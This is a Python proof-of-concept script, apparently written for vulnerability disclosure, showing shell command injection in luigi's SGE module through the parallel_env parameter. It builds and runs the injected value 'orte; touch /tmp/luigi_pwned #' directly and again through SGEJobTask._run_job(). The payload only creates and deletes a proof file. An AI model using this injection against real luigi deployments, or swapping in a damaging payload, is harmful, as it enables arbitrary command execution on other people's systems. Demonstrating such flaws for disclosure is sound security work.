#!/usr/bin/env python3
"""
Luigi SGE Command Injection - Proof of Concept
Package: luigi
File:    luigi/contrib/sge.py
Sink:    subprocess.check_output(submit_cmd, shell=True)
Source:  parallel_env = luigi.Parameter()

The `parallel_env` parameter is inserted directly into the qsub command
string via str.format() with no sanitization, then passed to
subprocess.check_output() with shell=True. Any user who can set
luigi parameters (via CLI, config file, or code) can inject arbitrary
shell commands.

Vulnerable code path:
  SGEJobTask._run_job()
    -> _build_qsub_command(..., pe=self.parallel_env, ...)
    -> subprocess.check_output(submit_cmd, shell=True)   # line 303
"""

import subprocess
import os
import tempfile

import luigi
from luigi.contrib.sge import SGEJobTask, _build_qsub_command

PROOF_FILE = '/tmp/luigi_pwned'
E2E_PROOF_FILE = '/tmp/luigi_e2e_pwned'

# --- Benign baseline ---
safe_pe = 'orte'
safe_cmd = _build_qsub_command(
    cmd='python runner.py /tmp/task',
    job_name='TestTask',
    outfile='/tmp/task/job.out',
    errfile='/tmp/task/job.err',
    pe=safe_pe,
    n_cpu=2,
)
print('[*] Normal qsub command:')
print(f'    {safe_cmd}\n')

# --- Injected input ---
# Attacker sets parallel_env via: --parallel-env 'orte; <payload>'
# e.g., luigi MyTask --parallel-env 'orte; touch /tmp/luigi_pwned #'
malicious_pe = f'orte; touch {PROOF_FILE} #'
injected_cmd = _build_qsub_command(
    cmd='python runner.py /tmp/task',
    job_name='TestTask',
    outfile='/tmp/task/job.out',
    errfile='/tmp/task/job.err',
    pe=malicious_pe,
    n_cpu=2,
)
print('[*] Injected qsub command:')
print(f'    {injected_cmd}\n')

# --- Execute to confirm injection ---
print('[*] Executing injected command (qsub not required)...')
try:
    output = subprocess.check_output(injected_cmd, shell=True, stderr=subprocess.STDOUT)
    print(output.decode())
except subprocess.CalledProcessError as e:
    # qsub will fail (not installed), but the injected command runs first
    print(e.output.decode())

# --- Verify payload ran ---
if os.path.exists(PROOF_FILE):
    print(f'[+] SUCCESS: Payload executed. Proof file created at {PROOF_FILE}')
    os.remove(PROOF_FILE)
else:
    print('[-] Proof file not found — check output above.')

# =============================================================================
# STAGE 2: End-to-end through SGEJobTask._run_job()
# =============================================================================
# This stage instantiates a real SGEJobTask subclass, sets parallel_env to
# the malicious value via the constructor (same as --parallel-env on CLI),
# and calls _run_job() directly — the actual method that builds and executes
# the qsub command in production.
#
# _run_job() flow:
#   line 298: submit_cmd = _build_qsub_command(..., pe=self.parallel_env, ...)
#   line 303: output = subprocess.check_output(submit_cmd, shell=True)  <-- injection fires
#   line 304: self.job_id = _parse_qsub_job_id(output)                  <-- fails (qsub missing)
#
# The proof file is created at line 303. The IndexError at line 304 is
# expected and does not prevent the injection from executing.

print('\n' + '=' * 60)
print('STAGE 2: End-to-end via SGEJobTask._run_job()')
print('=' * 60)

class MaliciousTask(SGEJobTask):
    """Minimal SGEJobTask subclass with injected parallel_env."""
    def work(self):
        pass
    def output(self):
        return luigi.LocalTarget('/tmp/dummy_output')

# Instantiate with malicious parallel_env — same as passing:
#   --parallel-env 'orte; touch /tmp/luigi_e2e_pwned #'
# on the command line or setting parallel-env in luigi.cfg
task = MaliciousTask(
    parallel_env=f'orte; touch {E2E_PROOF_FILE} #',
    no_tarball=True,
)

# Set tmp_dir to a real directory — _init_local() normally does this,
# but it's unrelated to the vulnerability (it pickles the task for SGE).
task.tmp_dir = tempfile.mkdtemp()

print(f'[*] Task parallel_env = {repr(task.parallel_env)}')
print(f'[*] Calling SGEJobTask._run_job() ...\n')

try:
    task._run_job()
except (IndexError, Exception) as e:
    # IndexError: _parse_qsub_job_id fails on empty output (qsub not installed)
    # Injection at line 303 already executed before this point.
    print(f'[*] _run_job() raised after injection point: {type(e).__name__}: {e}')

if os.path.exists(E2E_PROOF_FILE):
    print(f'\n[+] SUCCESS: End-to-end injection confirmed.')
    print(f'    Proof file created by SGEJobTask._run_job(): {E2E_PROOF_FILE}')
    os.remove(E2E_PROOF_FILE)
else:
    print('[-] End-to-end proof file not found.')
